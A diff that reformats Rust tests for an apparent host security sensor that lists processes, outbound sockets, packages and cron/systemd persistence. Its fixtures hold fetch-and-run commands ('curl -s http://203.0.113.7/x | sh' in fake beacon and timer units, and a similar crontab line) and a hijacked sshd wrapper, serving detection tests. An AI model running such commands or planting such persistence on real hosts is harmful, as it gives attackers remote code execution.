@@ -164,11 +164,20 @@ mod tests {
         let other_namespace = STAT.replace("987654", "999999");
         let kernel_thread = "4242 (kthreadd) S 0 0 0 0 -1 2129984 0 0 0 0 0 0 0 0 20 0 1 0 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0";
 
-        fake_process(&root, FakeProcess { pid: 100, stat: STAT, uid: 0, command_line: b"/usr/sbin/sshd\0-D\0", exe: "/usr/sbin/sshd", namespace: 1, sockets: &[1001, 1002] });
-        fake_process(&root, FakeProcess { pid: 200, stat: &child_of_sshd, uid: 1000, command_line: b"bash\0-i\0", exe: "/usr/bin/bash", namespace: 1, sockets: &[1003] });
+        fake_process(
+            &root,
+            FakeProcess { pid: 100, stat: STAT, uid: 0, command_line: b"/usr/sbin/sshd\0-D\0", exe: "/usr/sbin/sshd", namespace: 1, sockets: &[1001, 1002] },
+        );
+        fake_process(
+            &root,
+            FakeProcess { pid: 200, stat: &child_of_sshd, uid: 1000, command_line: b"bash\0-i\0", exe: "/usr/bin/bash", namespace: 1, sockets: &[1003] },
+        );
         fake_process(&root, FakeProcess { pid: 300, stat: &zombie, uid: 1000, command_line: b"", exe: "/usr/bin/gone", namespace: 1, sockets: &[] });
         fake_process(&root, FakeProcess { pid: 2, stat: kernel_thread, uid: 0, command_line: b"", exe: "/nonexistent", namespace: 1, sockets: &[] });
-        fake_process(&root, FakeProcess { pid: 400, stat: &other_namespace, uid: 0, command_line: b"nginx\0", exe: "/usr/sbin/nginx", namespace: 2, sockets: &[1003] });
+        fake_process(
+            &root,
+            FakeProcess { pid: 400, stat: &other_namespace, uid: 0, command_line: b"nginx\0", exe: "/usr/sbin/nginx", namespace: 2, sockets: &[1003] },
+        );
         for pid in [100, 200] {
             std::fs::write(root.join(pid.to_string()).join("net/tcp"), TCP_TABLE).unwrap();
             std::fs::write(root.join(pid.to_string()).join("net/tcp6"), TCP6_TABLE).unwrap();
@@ -250,11 +259,7 @@ mod tests {
         let mut sensor = Sensor::new(real_proc(), std::process::id(), 60, 300);
         sensor.poll(now());
 
-        let mut child = Command::new("/bin/sh")
-            .args(["-c", "read line; exec sleep 300"])
-            .stdin(Stdio::piped())
-            .spawn()
-            .unwrap();
+        let mut child = Command::new("/bin/sh").args(["-c", "read line; exec sleep 300"]).stdin(Stdio::piped()).spawn().unwrap();
         let pid = child.id();
 
         let created = poll_until(&mut sensor, pid, |event| matches!(event.action, ProcessAction::Create));
@@ -284,16 +289,10 @@ mod tests {
         source.processes().unwrap();
         let sockets = source.outbound_sockets().unwrap();
 
-        let ours: Vec<Socket> = sockets
-            .iter()
-            .filter(|socket| socket.local == client.local_addr().unwrap() && socket.remote == listener.local_addr().unwrap())
-            .cloned()
-            .collect();
+        let ours: Vec<Socket> =
+            sockets.iter().filter(|socket| socket.local == client.local_addr().unwrap() && socket.remote == listener.local_addr().unwrap()).cloned().collect();
         assert_eq!(ours.len(), 1, "the connecting end is listed once");
-        assert!(
-            sockets.iter().all(|socket| socket.local.port() != listener.local_addr().unwrap().port()),
-            "the accepting end is not outbound"
-        );
+        assert!(sockets.iter().all(|socket| socket.local.port() != listener.local_addr().unwrap().port()), "the accepting end is not outbound");
 
         let holders = source.socket_holders(&ours);
         assert_eq!(holders.get(&ours[0].inode), Some(&vec![std::process::id()]));
@@ -459,15 +458,7 @@ mod tests {
     }
 
     fn listed(kind: PersistenceKind, name: &str, path: &str, command: &str, user: &str, enabled: bool, hash: Option<String>) -> PersistenceItem {
-        PersistenceItem {
-            kind,
-            name: name.to_string(),
-            path: path.to_string(),
-            command: command.to_string(),
-            user: user.to_string(),
-            enabled,
-            hash,
-        }
+        PersistenceItem { kind, name: name.to_string(), path: path.to_string(), command: command.to_string(), user: user.to_string(), enabled, hash }
     }
 
     #[test]
@@ -542,10 +533,8 @@ mod tests {
 
     #[test]
     fn test_user_crontab_lines_have_no_user_field() {
-        let entries = persistence::parse_crontab(
-            "MAILTO=\"\"\n0 3 * * 1-5 /home/dana/backup.sh > /dev/null 2>&1\n@daily curl -s https://example.test/x | sh\n",
-            false,
-        );
+        let entries =
+            persistence::parse_crontab("MAILTO=\"\"\n0 3 * * 1-5 /home/dana/backup.sh > /dev/null 2>&1\n@daily curl -s https://example.test/x | sh\n", false);
 
         assert_eq!(
             entries,
@@ -658,7 +647,15 @@ mod tests {
         assert_eq!(
             tree.scan(),
             vec![
-                listed(PersistenceKind::SystemdUnit, "backup.service", "/etc/systemd/system/backup.service", "/usr/local/bin/backup --all", "backup", true, sha256(backup)),
+                listed(
+                    PersistenceKind::SystemdUnit,
+                    "backup.service",
+                    "/etc/systemd/system/backup.service",
+                    "/usr/local/bin/backup --all",
+                    "backup",
+                    true,
+                    sha256(backup)
+                ),
                 listed(PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", "root", false, sha256(sshd)),
             ],
             "a unit nothing wants is not enabled, /lib is /usr/lib and is read once, targets are not listed"
@@ -717,8 +714,24 @@ mod tests {
         assert_eq!(
             tree.of(PersistenceKind::SystemdUnit),
             vec![
-                listed(PersistenceKind::SystemdUnit, "beacon.service", "/etc/systemd/system/beacon.service", "/bin/sh -c 'curl -s http://203.0.113.7/x | sh'", "nobody", false, sha256(beacon)),
-                listed(PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/tmp/.sshd-wrapper", "root", false, sha256(&format!("{}{}", sshd, drop_in))),
+                listed(
+                    PersistenceKind::SystemdUnit,
+                    "beacon.service",
+                    "/etc/systemd/system/beacon.service",
+                    "/bin/sh -c 'curl -s http://203.0.113.7/x | sh'",
+                    "nobody",
+                    false,
+                    sha256(beacon)
+                ),
+                listed(
+                    PersistenceKind::SystemdUnit,
+                    "ssh.service",
+                    "/usr/lib/systemd/system/ssh.service",
+                    "/tmp/.sshd-wrapper",
+                    "root",
+                    false,
+                    sha256(&format!("{}{}", sshd, drop_in))
+                ),
             ],
             "the drop-in replaces the command and is part of the hash"
         );
@@ -726,7 +739,15 @@ mod tests {
             tree.of(PersistenceKind::SystemdTimer),
             vec![
                 listed(PersistenceKind::SystemdTimer, "orphan.timer", "/etc/systemd/system/orphan.timer", "", "root", false, sha256(orphan)),
-                listed(PersistenceKind::SystemdTimer, "sync.timer", "/etc/systemd/system/sync.timer", "/bin/sh -c 'curl -s http://203.0.113.7/x | sh'", "nobody", true, sha256(timer)),
+                listed(
+                    PersistenceKind::SystemdTimer,
+                    "sync.timer",
+                    "/etc/systemd/system/sync.timer",
+                    "/bin/sh -c 'curl -s http://203.0.113.7/x | sh'",
+                    "nobody",
+                    true,
+                    sha256(timer)
+                ),
             ],
             "a timer is listed with the command and the user of the unit it starts"
         );
@@ -743,10 +764,7 @@ mod tests {
         let units: Vec<(String, String, bool)> = tree.of(PersistenceKind::SystemdUnit).into_iter().map(|item| (item.name, item.user, item.enabled)).collect();
         assert_eq!(
             units,
-            vec![
-                ("agent.service".to_string(), String::new(), false),
-                ("miner.service".to_string(), "dana".to_string(), true),
-            ],
+            vec![("agent.service".to_string(), String::new(), false), ("miner.service".to_string(), "dana".to_string(), true),],
             "a unit for every user names no user"
         );
     }
@@ -765,10 +783,42 @@ mod tests {
         assert_eq!(
             tree.scan(),
             vec![
-                listed(PersistenceKind::Cron, "17 * * * * root run-parts /etc/cron.hourly", "/etc/crontab", "run-parts /etc/cron.hourly", "root", true, sha256("17 * * * * root run-parts /etc/cron.hourly")),
-                listed(PersistenceKind::Cron, "*/5 * * * * backup /usr/local/bin/backup.sh", "/etc/cron.d/backup", "/usr/local/bin/backup.sh", "backup", true, sha256("*/5 * * * * backup /usr/local/bin/backup.sh")),
-                listed(PersistenceKind::Cron, "@reboot root /usr/local/bin/warm-cache", "/etc/cron.d/backup", "/usr/local/bin/warm-cache", "root", true, sha256("@reboot root /usr/local/bin/warm-cache")),
-                listed(PersistenceKind::Cron, "0 3 * * * /home/dana/sync.sh", "/var/spool/cron/crontabs/dana", "/home/dana/sync.sh", "dana", true, sha256("0 3 * * * /home/dana/sync.sh")),
+                listed(
+                    PersistenceKind::Cron,
+                    "17 * * * * root run-parts /etc/cron.hourly",
+                    "/etc/crontab",
+                    "run-parts /etc/cron.hourly",
+                    "root",
+                    true,
+                    sha256("17 * * * * root run-parts /etc/cron.hourly")
+                ),
+                listed(
+                    PersistenceKind::Cron,
+                    "*/5 * * * * backup /usr/local/bin/backup.sh",
+                    "/etc/cron.d/backup",
+                    "/usr/local/bin/backup.sh",
+                    "backup",
+                    true,
+                    sha256("*/5 * * * * backup /usr/local/bin/backup.sh")
+                ),
+                listed(
+                    PersistenceKind::Cron,
+                    "@reboot root /usr/local/bin/warm-cache",
+                    "/etc/cron.d/backup",
+                    "/usr/local/bin/warm-cache",
+                    "root",
+                    true,
+                    sha256("@reboot root /usr/local/bin/warm-cache")
+                ),
+                listed(
+                    PersistenceKind::Cron,
+                    "0 3 * * * /home/dana/sync.sh",
+                    "/var/spool/cron/crontabs/dana",
+                    "/home/dana/sync.sh",
+                    "dana",
+                    true,
+                    sha256("0 3 * * * /home/dana/sync.sh")
+                ),
                 listed(PersistenceKind::Cron, "logrotate", "/etc/cron.daily/logrotate", "", "root", true, sha256(script)),
                 listed(PersistenceKind::Cron, "not-executable", "/etc/cron.weekly/not-executable", "", "root", false, sha256("#!/bin/sh\n")),
             ]
@@ -1057,10 +1107,7 @@ mod tests {
     fn test_apk_database_lists_name_version_and_architecture() {
         assert_eq!(
             packages::parse(APK_INSTALLED.as_bytes(), PackageManager::Apk).unwrap(),
-            vec![
-                installed(PackageManager::Apk, "musl", "1.2.5-r10", "x86_64"),
-                installed(PackageManager::Apk, "busybox", "1.37.0-r18", "x86_64"),
-            ]
+            vec![installed(PackageManager::Apk, "musl", "1.2.5-r10", "x86_64"), installed(PackageManager::Apk, "busybox", "1.37.0-r18", "x86_64"),]
         );
     }
 
